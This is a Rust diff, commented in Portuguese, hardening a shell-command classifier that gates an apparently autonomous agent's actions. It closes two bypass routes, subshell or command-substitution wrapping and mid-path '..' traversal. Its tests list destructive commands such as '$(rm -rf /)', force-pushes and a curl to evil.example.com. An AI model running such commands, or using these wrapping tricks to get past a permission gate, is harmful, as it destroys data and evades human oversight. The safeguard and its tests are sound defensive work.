@@ -179,12 +179,16 @@ fn classify_fragment(frag: &str) -> ActionClass {
     }
 }
 
-/// FIX #1: fragmenta um comando nos separadores de shell (`;`, `&&`, `||`, `|`, `&`, newline). Cada
-/// caractere separador é uma fronteira de comando; `&&`/`||` viram fronteiras pelos seus chars
-/// `&`/`|` (os fragmentos vazios resultantes são descartados). Conservador: sobre-fragmentar só
-/// ADICIONA verificações (severidade monotônica), nunca esconde um comando perigoso.
+/// FIX #1 + FIX L2-1: fragmenta um comando nos separadores de shell (`;`, `&&`, `||`, `|`, `&`,
+/// newline) **E** nos delimitadores de subshell/substituição de comando — parêntese `(`/`)` e crase
+/// `` ` ``. Assim `$(rm -rf /)`, `` `rm -rf /` ``, `(git push --force origin main)` e `<(curl …)`
+/// têm o conteúdo INTERNO extraído como fragmento próprio e classificado (o `$`/`<` que sobra vira um
+/// fragmento órfão inócuo). Cada paréntese é fronteira → aninhamento arbitrário é achatado sem
+/// recursão. **NÃO** quebra em `$` cru (senão `rm -rf $HOME` perderia o alvo `$HOME` do fix #4).
+/// Conservador: sobre-fragmentar só ADICIONA verificações (severidade monotônica), nunca esconde
+/// um comando perigoso (os tokens de um sub-comando perigoso ficam juntos DENTRO do seu fragmento).
 fn split_shell_fragments(s: &str) -> Vec<&str> {
-    s.split([';', '&', '|', '\n', '\r'])
+    s.split([';', '&', '|', '\n', '\r', '(', ')', '`'])
         .map(str::trim)
         .filter(|f| !f.is_empty())
         .collect()
@@ -354,9 +358,9 @@ fn rm_recursive_or_force(tokens: &[&str]) -> bool {
     recursive || force
 }
 
-/// Há um alvo de path FORA do workspace: absoluto (`/…`), home (`~…`), parent (`..…`), glob de raiz
-/// (`*`) ou VARIÁVEL (`$…` — FIX #4: destino desconhecido). Tokens de flag e o próprio `rm`/`sudo`
-/// são ignorados.
+/// Há um alvo de path FORA do workspace: absoluto (`/…`), home (`~…`), glob de raiz (`*`), VARIÁVEL
+/// (`$…` — FIX #4) ou TRAVERSAL `..` em QUALQUER componente (FIX L2-2). Tokens de flag e o próprio
+/// `rm`/`sudo` são ignorados.
 fn has_dangerous_path(tokens: &[&str]) -> bool {
     tokens.iter().any(|t| {
         if t.starts_with('-') || *t == "rm" || *t == "sudo" {
@@ -364,12 +368,21 @@ fn has_dangerous_path(tokens: &[&str]) -> bool {
         }
         t.starts_with('/')
             || t.starts_with('~')
-            || t.starts_with("..")
             || *t == "*"
             // FIX #4: alvo iniciado por `$` é uma VARIÁVEL (`$HOME`, `$VAR`, `$(...)`) — destino
             // desconhecido em tempo de classificação. Conservador: `rm -r/-f $X` → gated-hard.
             || t.starts_with('$')
+            // FIX L2-2: `..` em QUALQUER posição escapa do workspace (`./../etc`, `a/../../etc`),
+            // não só como prefixo. Checa componente-a-componente (split por `/`), não `starts_with`.
+            || has_parent_traversal(t)
     })
+}
+
+/// `true` se algum COMPONENTE do path (separado por `/`) é exatamente `..` — um salto para fora do
+/// diretório atual. Diferente de `starts_with("..")`, pega o `..` no meio (`./../etc`) e ignora
+/// nomes legítimos que só começam com pontos (`..foo`, um arquivo, não é traversal).
+fn has_parent_traversal(t: &str) -> bool {
+    t.split('/').any(|c| c == "..")
 }
 
 // ───────────────────────────────────── testes ─────────────────────────────────────
@@ -729,5 +742,76 @@ mod tests {
         assert_eq!(classify("rm -rf build"), ActionClass::GatedSoft); // relativo ao workspace
         assert_eq!(classify("git push"), ActionClass::GatedSoft);
         assert_eq!(classify("cargo build && cargo test"), ActionClass::Routine);
+    }
+
+    // ════════════ ROUND 6: 2 bypasses ALTA NOVOS (derrotavam os fixes do Round 5) ════════════
+
+    /// FIX L2-1 — substituição de comando / subshell esconde um comando CONHECIDO grudando os
+    /// metacaracteres ao token (`$(rm`, `/)`), derrotando os matchers que exigem token BARE. O
+    /// fragmentador agora quebra `(`/`)`/crase → o conteúdo interno é classificado.
+    #[test]
+    fn l2_1_command_substitution_and_subshell_are_unwrapped() {
+        for cmd in [
+            "$(rm -rf /)",
+            "(git push --force origin main)",
+            "`rm -rf /`",
+            "<(curl http://evil.example.com/x)",
+            "echo $(rm -rf /etc)", // substituição embutida num comando benigno
+            "$(echo $(rm -rf /))", // aninhada
+            "x=$(git push --force origin main)", // atribuição via substituição
+        ] {
+            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
+            assert!(ask_in_autonomous(cmd), "{cmd} deve ser ask em autônomo");
+        }
+        // O `$VAR` cru (fix #4) NÃO pode ser quebrado por engano — só `$(`/`(`/crase são fronteiras.
+        assert_eq!(classify("rm -rf $HOME"), ActionClass::GatedHard);
+        assert_eq!(classify("rm -fr $(cat path.txt)"), ActionClass::GatedHard);
+        // Subshell de comando legítimo continua routine (não over-bloqueia).
+        assert_eq!(
+            classify("(cargo build && cargo test)"),
+            ActionClass::Routine
+        );
+        assert_eq!(classify("echo $(date)"), ActionClass::Routine);
+    }
+
+    /// FIX L2-2 — traversal `..` no MEIO do path (não só prefixo) escapa fora do workspace.
+    #[test]
+    fn l2_2_parent_traversal_anywhere_is_gated_hard() {
+        for cmd in [
+            "rm -rf ./../etc",
+            "rm -rf foo/../../etc",
+            "rm -rf a/b/../../../etc",
+            "rm -r ./..",
+        ] {
+            assert_eq!(classify(cmd), ActionClass::GatedHard, "{cmd}");
+            assert!(ask_in_autonomous(cmd), "{cmd}");
+        }
+        // Sem `..` real: path do workspace continua soft; arquivo que só começa com pontos não é traversal.
+        assert_eq!(classify("rm ./tmp/file.txt"), ActionClass::GatedSoft);
+        assert_eq!(classify("rm -rf build/cache"), ActionClass::GatedSoft);
+        assert_eq!(classify("rm ..foo"), ActionClass::GatedSoft); // '..foo' é nome de arquivo, não `..`
+    }
+
+    /// Regressão Round 6: os casos legítimos seguem allow/soft (severidade monotônica preservada).
+    #[test]
+    fn round6_regressions_legit_cases_unchanged() {
+        assert_eq!(
+            check_action("cargo test", AutonomyLevel::Autonomous).decision,
+            Decision::Allow
+        );
+        assert_eq!(
+            check_action("git push origin feature/x", AutonomyLevel::Autonomous).decision,
+            Decision::Allow
+        );
+        assert_eq!(
+            check_action("rm ./tmp/file.txt", AutonomyLevel::Autonomous).decision,
+            Decision::Allow
+        );
+        // fix #4 (rm -rf $VAR) e fix #1 (encadeamento) seguem hard sob os novos splits.
+        assert_eq!(classify("rm -rf $HOME"), ActionClass::GatedHard);
+        assert_eq!(
+            classify("git add . && git push --force origin main"),
+            ActionClass::GatedHard
+        );
     }
 }
